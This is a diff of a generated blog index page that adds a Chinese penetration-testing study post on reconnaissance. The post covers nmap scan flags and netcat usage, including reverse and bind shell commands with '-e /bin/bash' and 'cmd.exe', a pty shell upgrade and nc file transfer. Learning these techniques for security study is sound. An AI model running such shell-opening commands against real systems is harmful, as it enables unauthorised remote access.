@@ -64,6 +64,116 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
+  <time datetime="2021-07-14T02:31:33.000Z" itemprop="datePublished">2021-07-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>1-存活主机</p>
+<p>2-端口扫描</p>
+<p>3-防火墙侦测</p>
+<p>4-漏洞扫描</p>
+<p>5-操作系统</p>
+<p>banner:指的是指纹(版本信息、服务器(中间件)信息、开发商信息…)</p>
+<p>nmap扫描结果的三种状态:</p>
+<p>open(开放)</p>
+<p>closed(关闭)</p>
+<p>filtered(不确定是否开放)</p>
+<h4 id="常用操作指令"><a href="#常用操作指令" class="headerlink" title="常用操作指令"></a><strong>常用操作指令</strong></h4><p>基本用法:nmap IP</p>
+<p>-Pn:跳过主机存活判断,默认判断存活(推荐)</p>
+<p>-sS：SYN扫描（隐匿） </p>
+<p>-sV：探测打开的端口以确定服务/版本</p>
+<p>-sSV=  -sS   -sV</p>
+<p>-O:    操作系统的判断</p>
+<p>-T:    扫描速度的设置(推荐T4)</p>
+<p>-p:    指定端口扫描,-p 端口号 | -p- 全端口扫描 | -p0-65535|-p100-1000 | -p 80,445,3389</p>
+<p>–script=脚本名</p>
+<p>–script=模糊测试的脚本简写的名称</p>
+<p>-sC：相当于–script=defaults</p>
+<p>-oN: 标准输出</p>
+<p>​    例如:-oN 1.txt</p>
+<h4 id="NC-netcat"><a href="#NC-netcat" class="headerlink" title="NC(netcat)"></a>NC(netcat)</h4><p> 常用参数:</p>
+<p> -c | -e: 执行命令或者程序,常用于反弹shell</p>
+<p> -l:开启监听</p>
+<p> -p:设定端口</p>
+<p> -z:零输入输出,常用于端口开放检测,(连上立即断开)</p>
+<p> -v -vv:详细信息|更详细的信息</p>
+<p> -n:仅显示数字的ip地址,不显示DNS信息</p>
+<p>创建监听:</p>
+<p>nc -lp 指定端口号                监听端口</p>
+<p>nc -lvvp 指定端口号            监听端口并显示详细的信息</p>
+<p>nc -lnvp 指定端口号            监听端口并显示详细的信息</p>
+<p>连接:</p>
+<p>nc ip port</p>
+<p>端口扫描:</p>
+<p>nc -vz IP 端口号[单个端口,端口列表(80-1024)]</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell:"></a>反弹shell:</h4><p>在linux中:</p>
+<p> # –&gt; 特权用户(比如说 root)</p>
+<p> $ –&gt; 普通用户</p>
+<p>linux中默认的编码格式:utf8    占两个字符        </p>
+<p>windows中默认的编码格式:gbk     占三个字符        </p>
+<p>windows命令行切换utf8:chcp 65001</p>
+<p>windows命令行切换gbk:chcp 936</p>
+<p>lsof -i:port    查看指定端口开放情况</p>
+<p>netstat -lutpn 查看端口开放情况</p>
+<p>正向连接:指服务器主动反弹shell</p>
+<p>​    以linux反弹shell为例:</p>
+<p>​    服务端开启监听</p>
+<p>​    nc -lvvp port -e /bin/bash</p>
+<p>​    客户端连接</p>
+<p>​    nc -v ip port </p>
+<p>反向连接:指客户端主动反弹shell</p>
+<p>​    以windows反弹shell为例:</p>
+<p>​    服务端开启监听</p>
+<p>​    nc -lvvp 4444</p>
+<p>​    客户端反弹shell</p>
+<p>​    nc ip port -e “c:\windows\system32\cmd.exe”</p>
+<p>​    </p>
+<p>​    linux会话提升:python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
+<p>python -c “import pty;pty.spawn(‘/bin/bash’)”<br>                id</p>
+<p>​                用户id=0(root) 组id=0(root) 组=0(root)</p>
+<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>​    正向传输:</p>
+<p>​    传输</p>
+<p>​    -q 1 :传输完立马断开,不加就一直卡住</p>
+<p>​    nc -lvvp port &lt; 1.txt -q 1</p>
+<p>​    接收</p>
+<p>​    nc ip port &gt; 2.txt</p>
+<p>​    反向传输:</p>
+<p>​    传输</p>
+<p>​    nc ip port &lt; 1.txt -q 1</p>
+<p>​    接收</p>
+<p>​    nc -lvvp port &gt; 2.txt</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckw8yh26k000sjovj4djv6bhe" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-注册表自启动和粘滞键后门" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" class="article-date">
@@ -106,7 +216,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckw24ym2z0017i4vjf7syffep" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckw8yh26u0016jovj4jop4ulk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -183,7 +293,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckw24ym2v0011i4vj69vb9lo8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckw8yh26n000yjovj6q52f93x" class="article-share-link">Share</a>
       
       
     </footer>
@@ -220,7 +330,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckw24ym280006i4vjbxppez7r" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckw8yh2640007jovjhp901yes" class="article-share-link">Share</a>
       
       
     </footer>
@@ -257,7 +367,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckw24ym290007i4vj2fsodvwu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckw8yh2630006jovj2mgk43l6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -325,7 +435,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckw24ym270005i4vjggkb5fy7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckw8yh2610004jovjc1vs3xje" class="article-share-link">Share</a>
       
       
     </footer>
@@ -362,7 +472,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckw24ym230001i4vje95md5f6" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckw8yh25x0001jovj7fza8cl5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -411,7 +521,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckw24ym2g000fi4vj6csr50ok" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckw8yh26b000fjovj6d2384za" class="article-share-link">Share</a>
       
       
     </footer>
@@ -457,6 +567,10 @@ default:
       <ul>
         
           <li>
+            <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
           </li>
         
@@ -470,10 +584,6 @@ default:
         
           <li>
             <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
           </li>
         
       </ul>
